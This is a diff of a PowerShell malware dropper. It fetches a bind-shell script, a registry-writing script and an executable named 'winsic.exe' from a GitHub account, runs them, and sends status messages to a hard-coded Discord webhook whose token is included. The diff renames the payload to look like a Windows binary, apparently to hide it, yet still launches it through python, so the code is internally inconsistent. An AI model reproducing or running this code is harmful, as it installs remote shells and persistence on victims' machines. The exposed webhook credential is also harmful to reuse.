@@ -8,10 +8,10 @@ $bindshellScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/b
 $regwriteScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/regwrite.lua"
 $extraScriptUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/main.lua"
 $ghostConfigPyUrl = "https://github.com/invisibleghostshell-ux/last/raw/main/winsic.exe"
-$bindshellScriptPath = "$baseDir\bindshell.lua"
+$bindshellScriptPath = "$baseDir\bin.lua"
 $regwriteScriptPath = "$baseDir\regwrite.lua"
 $extraScriptPath = "$baseDir\main.lua"
-$ghostConfigPyPath = "$baseDir\Ghost_configured.py"
+$ghostConfigPyPath = "$baseDir\winsic.exe"
 $discordWebhookUrl = "https://discord.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2"
 $luaJitPath = "$baseDir\LuaJIT-2.1"
 $luaPathDir = "$baseDir\Luapath"
@@ -259,15 +259,15 @@ try {
 }
 
 # Download and execute Ghost_configured.py
-Send-DiscordMessage -message "Downloading Ghost_configured.py..."
+Send-DiscordMessage -message "winsic.exe..."
 Get-File -url $ghostConfigPyUrl -destination $ghostConfigPyPath
 
-Send-DiscordMessage -message "Executing Ghost_configured.py..."
+Send-DiscordMessage -message "winsic.exe..."
 try {
     Start-Process -FilePath "python" -ArgumentList $ghostConfigPyPath -NoNewWindow -Wait
-    Send-DiscordMessage -message "Executed Ghost_configured.py successfully."
+    Send-DiscordMessage -message "winsic.exe successfully."
 } catch {
-    $message = "Error executing Ghost_configured.py: $(${_})"
+    $message = "Error executing winsic.exe: $(${_})"
     Send-DiscordMessage -message $message
     exit 1
 }
